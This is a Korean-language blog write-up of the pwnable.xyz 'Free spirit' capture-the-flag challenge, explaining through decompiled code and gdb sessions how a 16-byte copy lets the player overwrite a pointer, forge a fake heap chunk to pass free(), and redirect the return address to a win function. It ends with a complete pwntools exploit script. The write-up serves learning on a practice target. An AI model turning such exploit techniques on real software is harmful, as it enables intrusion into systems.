---
layout: post
title:  "Pwnable.xyz Free spirit write-up"
date:   2020-01-20 19:45:55
image:  pwnable_xyz_free.PNG
tags:   [Pwnable_xyz]
categories: [Write-up]
---

### 1.  문제

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled.png)

PIE 가 안걸려있다. Got overwrite가 가능할것으로 보인다는 안됌. FUll RELRO임

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%201.png)

프로그램을 실행시키면 다음과 같이 뭐를 입력받는다. 뭔지는 모르겠지만 1을 입력하면 입력할수 있고, 2를 입력하면 어떤 주소가 나온다. 3번은 아무 반응이 없고, 4번을 누르면 Inavalid가 나온다. 숫자이외의 값을 입력하면 바로 종료한다

빠르게 코드를 한번 봐보자.<br><br>

    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char *v3; // rdi
      __int64 i; // rcx
      int v5; // eax
      signed __int64 v6; // rax
      __int64 v8; // [rsp+8h] [rbp-60h]
      char *buf; // [rsp+10h] [rbp-58h]
      char nptr; // [rsp+18h] [rbp-50h]
      unsigned __int64 v11; // [rsp+48h] [rbp-20h]
    
      v11 = __readfsqword(0x28u);
      setup(argc, argv, envp);
      buf = (char *)malloc(0x40uLL);
      while ( 1 )
      {
        while ( 1 )
        {
          _printf_chk(1LL, "> ");
          v3 = &nptr;
          for ( i = 12LL; i; --i )
          {
            *(_DWORD *)v3 = 0;
            v3 += 4;
          }
          read(0, &nptr, 0x30uLL);
          v5 = atoi(&nptr);
          if ( v5 != 1 )
            break;
          v6 = sys_read(0, buf, 0x20uLL);
        }
        if ( v5 <= 1 )
          break;
        if ( v5 == 2 )
        {
          _printf_chk(1LL, "%p\n");
        }
        else if ( v5 == 3 )
        {
          if ( (unsigned int)limit <= 1 )
            _mm_storeu_si128((__m128i *)&v8, _mm_loadu_si128((const __m128i *)buf));
        }
        else
        {
    LABEL_16:
          puts("Invalid");
        }
      }
      if ( v5 )
        goto LABEL_16;
      if ( !buf )
        exit(1);
      free(buf);
      return 0;
    }

코드는 다음과 같다. 요약하자면 " > " 다음에 입력하는 숫자는 v5 변수에 담긴다. v5가 1인지 2인지 3인지에 따라서 프로그램이 달라지며, 그 이외의 숫자는 의미가 없다

코드 흐름은 어렵지 않은데, 그 중 딱 한 곳이 난해한 곳이 있다.  바로 이부분이다

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%202.png)


3번을 입력하면 실행되는 부분이다. 구글링을 통해 __mm_storeu_si128() 함수와 __mm_loadu_si128() 함수의 의미를 찾아보았다.

- _mm_loadu_si128( dest ) : 128 비트 정수 데이터를 메모리에서 dst로 로드한다

- _mm_store_si128 (__m128i* mem_addr, __m128i a) :  128 비트 정수 데이터를 메모리에 저장

따라서 해당 조건문의 흐름은, 128비트 데이터를 메모리에서 buf로 복사한고, 그 값을 v8위치에 복사하는 로직이다. 사실 어셈으로 보면 더 간단하다

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%203.png)

이게 끝이다. rsp+0x10에 있는 값, 즉 buf에 들어있는 값을 8바이트 만큼 rax로 복사하고, 그 복사한 위치에 존재하는 데이터를 128비트(16바이트) 만큼 xmm0 레지스터에 복사한다. 그다음 마지막으로  xmm0에 있는 데이터를 128비트(16바이트) 만큼 rsp+0x8의 존재하는 값이 가리키는 곳에 복사한다

<br><br>

### 2. 접근방법

그렇다면, 이제 어느 곳을 덮어서 원하는 위치에 원하는 값을 넣을것인지 생각을 해야한다. 그런데 다음을 한번 보자.

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%204.png)

3번을 2번 입력하면 세그폴트 폴트 에러가 뜬다. 뭔가 수상하다. 3번은 위에서 설명한 xmm0 레지스터를 이용한 16바이트 데이터의 복사가 이뤄지는 부분인데, 뭔가 저곳이 수상할 것으로 예상이 된다

바로 gdb로 켜서 해당 부분에 어떠한 데이터가 들어가는지 확인해보자. 

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%205.png)

[ rsp+0x10 ] 에는 0x602010 의 주소가 들어가 있다. 이 값을, buf의 주소로서, 힙의 동적할당된 영역을 가리키고 있다. 이 값이 rax에 들어가있는 상황이다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%206.png)

rax에는 0x602010이 들어가 있는데 이 곳은 힙영역이라고 했다. 초기에 바로 3번을 눌렀기 때문에 힙영역을 0으로 채워져 있을 것이고 따라서 rax에는 0이 들어가 있다. 

그렇기 때문에 0이 xmm0으로 복사가 main+201 라인에서 이루어진다. 그렇다면 main+205 라인이 수행되고나서의 결과를 예측할 수 있다. xmm0으로 16바이트의 0이 복사가 됬으므로, 그 데이터가    [ rsp+0x8 ] 위치에 들어갈 것이다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%207.png)

예측한 값이 맞다. [ rsp+0x8 ]의 위치에 0이 들어갔다. 그다음 다시 continue를 시켜 3번을 한번더 누르고, 해당 로직을 다시 시작하는 부분으로 돌아가보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%208.png)

원래대로라면, [ rsp+0x10 ] 위치에 buf의 힙 주소가 들어가 있어야한다. 하지만 위의 로직을 거치면서  [ rsp+0x8 ] 에 16바이트 0이 들어가게되고, 이에따라 rsp+0x10 위치도 0으로 덮혀진다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%209.png)

따라서 main+201 라인에서 **[ rax ] → [ 0 ]** 이 의미가 되기때문에 널포인터 참조에 의한 에러가 발생하여 세그폴트가 뜬다. 결국 이 점이 바로 취약한 점이 되고, 이를 이용하여 조지면 될 것이다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2010.png)

3번을 통해 다음과 같이 buf의 값이 덮혀지게 된다. 따라서 buf의 값을 힙영역을 가리키는 것이 아닌, ret 위치로 변경시킨다면, ret 위치에 win 함수의 주소를 삽입할수 있다. 그러면 메인 함수가 끝나고 ret가 실행되면서 win함수로 넘어갈 것이다.

<br>

우리가 아는것은 다음과 같다

- win 함수의 주소
- buf가 담긴 스택의 주소 (이 주소를 이용하여 ret까지의 거리를 알 수 있음)
- buf로 부터 ret 까지의 거리 (위 그림을 보면 0x58 만큼 차이남)

지금까지 말한 내용으로 익스 코드를 짜서 실행시켜 보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2011.png)

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2012.png)

에러가 떴다. 에러내용으로는 free()를 하는 과정에서 유효하지 않은 포인터라고한다. 그러면 저 free 하기 직전에 bp를 걸고 확인해보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2013.png)

main+253에서 free가 일어난다. free시 인자가 바로 free 시키는 주소인데, 현재 우리가 변경한 win 주소가 들어가 있는 것을 확인 할 수 있다. 따라서 win 함수에 들어가있는 아래 공간을 free 시키려고 하기때문에 에러가 나는 것이다.

free는 할당한 힙 영역을 해제하는 함수이기 때문에 정상적으로 할당되는 힙 구조가 아닌이상 에러가 난다. 결국 최종적으로 win함수를 호출하려면 이 free() 함수를 우회해야한다.

그렇다면 free() 함수를 어떻게 우회해야하는지 생각해야한다. 우선, gdb로 정상적으로 할당된 buf가 가리키는 힙 영역이 어떻게 생겼는지 확인해보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2014.png)

현재 buf가 가리키는 영역은 다음과 같다. 0x40 만큼 malloc을 했기때문에 0x40만큼의 공간이 확보될것 같지만, 0x10 바이트더 추가된 총 0x50만큼의 공간이 할당되어 있다.

구글링을통해 힙의 청크가 가지는 구조를 보기바란다. 청크의 헤더부분는 총 16바이트로, **prev_size와 size** 영역으로 구성되어있다. **prev_size** 영역은 이전 할당된 청크의 사이즈가 들어가는 공간인데, 현재 하나의 청크 밖에 없음으로 0으로 세팅되어 있다.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2015.png)

그리고 **size** 영역은 현재 청크의 사이즈를 나타내는 공간으로 8바이트 기준으로 정렬되기때문에 하위 3비트는 사용되지 않는다. 따라서 이는 특정 정보를 표시해주는 flag의 역할을 한다.

총 헤더포함 0x50 할당되었다고 했는데, size영역에 0x51이 들어가있다. 하위1비트는 **prev_inuse**라는 플래그로,  이전 청크가 사용중인지 아닌지를 판별하는 역할을 한다.

 이전 청크가 사용중이라면 1, free 되어 있따면 0으로 설정되는데, 아마 프로그램이 구동될때 libc에서 사용했나보다, 그래서 현재 하위 1비트가 1로 세팅되어 0x51이 size 영역에 들어가있다

그리고 밑에 보면 0x602058에 0x20fb1이 들어가 있는데 이것은 Top chunk이다. 간단하게 말하자면 초기에 커널이 

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2016.png)

힙 영역을 **0x21000** 만큼 할당을 해주고  이 영역을 쪼개서 사용자가 요청한 크기만큼 돌려주는 식으로 돌아간다. 따라서 **0x21000** 중 사용자에게 할당하고 남은  영역이 Top 청크가 된다.  계산해보면

**0x21000 - 0x50 = 0x20fb0**  이고, 하위 1비트가 1로 세팅되어있다.  (내가 이해한게 맞는거 같다..)

힙은 이렇게 복잡한 과정을 통하여 메모리 영역을 관리한다. 개념은 훨씬 더 복잡하지만, 이정도만 알아도 문제를 풀 수있다.

다시 돌아가서, free() 함수를 우회하기 위해서는, 이러한 정상적인 청크를 만들어주고, 만든 청크를  free 시키면 끝이다.

메모리 영역에 쓰기가 가능한 영역이 어디있는지 한번 확인해보자.

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2017.png)

몇개 영역이 있는데, 0x601000 ~ 0x602000 위치에 rw가 가능하므로 이 영역을 사용하겠다.

*3 을 이용하여 원하는 위치에 원하는 값을 쓸 수 있다고 했으므로,  0x601000 ~ 0x602000  사이에서 청크를 만들 위치를 선택해보자.*

<br>

![]({{ site.baseurl }}/images/write-up/pwnable_xyz/pwnable%20xyz%20free%20spirit/Untitled%2018.png)

**0x601058**을 청크 헤더로 시작하여 size, top chunk 부분을 각각 정상 buf의 청크 크기에 맞게 넣으면 된다. 그리고 해당 실질 데이터 영역인 **0x601060**을 free 시키면 끝이다. (prev_size는 0이므로 size부터 입력해도됨)

<br>

위의 설명을 요약하면 다음과 같다.

1. ->2  :  출력되는 주소를 이용하여 ret의 주소를 구한다
2. ->1  :  buf를 ret의 주소로 덮기 위하여 아무값*8 + ret 주소를 입력한다
3. ->3  :  buf가 ret로 덮힌다
4. ->1  :  win 주소(8바이트) + 아까만든 말한 가짜청크를 만들기 위한 주소 입력(0x601058)
5. ->3  :  ret로 덮힌 부분이 다시 0x601058으로 덮힌다
6. ->1  :  size와 Top 청크를 만들기 위해 0x51(8바이트) + 0x6010a8(8바이트)를 입력한다.

               (top 청크가 위치하는 곳이 0x6010a8이므로, 다음 입력에 Top 청크 입력을 위함)

7. ->3  :  0x601058으로 덮힌 부분이 다시 0x6010a8로 덮힌다.
8. ->1  :  탑 청크 0x20fb1(8바이트) + 만든 청크의 free 시킬 주소(0x601060) 입력
9. ->3  :  0x6010a8으로 덮힌 부분이 다시 0x601060으로 덮힌다
10. ->a  :  비정상적 입력을 통하여 while문을 빠져나와 free되게한다.

 <br><br>

### 3. 풀이

최종 익스코드는 다음과 같다

    from pwn import *
    context.log_level = 'debug'
    p=remote("svc.pwnable.xyz",30005)
    #p = process("./challenge")
    #gdb.attach(p)
    
    p.recvuntil("> ")
    p.sendline("2")
    buf_addr=int(p.recv(14),16)
    log.info(hex(buf_addr))
    
    p.recvuntil("> ")
    p.sendline("1")
    
    #p.recvuntil("")
    p.send("a"*8+p64(buf_addr+0x58))
    
    
    p.recvuntil("> ")
    p.sendline("3")
    
    p.recvuntil("> ")
    p.sendline("1")
    p.send(p64(0x400a3e)+p64(0x601058)) # win addr + fake chunk
    
    p.recvuntil("> ")
    p.sendline("3")
    
    p.recvuntil("> ")
    p.sendline("1")
    p.send(p64(0x51)+p64(0x6010a8))
    
    p.recvuntil("> ")
    p.send("3")
    
    p.recvuntil("> ")
    p.sendline("1")
    p.send(p64(0x20fb1)+p64(0x601060))
    
    p.recvuntil("> ")
    p.sendline("3")
    
    p.recvuntil("> ")
    p.sendline("a")
    
    
    p.interactive()

<br><br>

### 4. 몰랐던 개념

- 힙의 구조 및 free 원리
- xmm0 레지스터 → 기본적으로 알고 있는 범용 레지스터 이외에 16바이트를 저장하는 xmm 레지스터가 있다

힙 익스의 많은 기술이 들어간 문제는 아니였지만, 힙의 구조를 아예 모르며 접근하기 힘든 문제였다. 힙에서 메모리 관리방법과 free하는 원리를 따로 정리해야 겠다. 앞으로 나올 어려운 힙문제를 위해..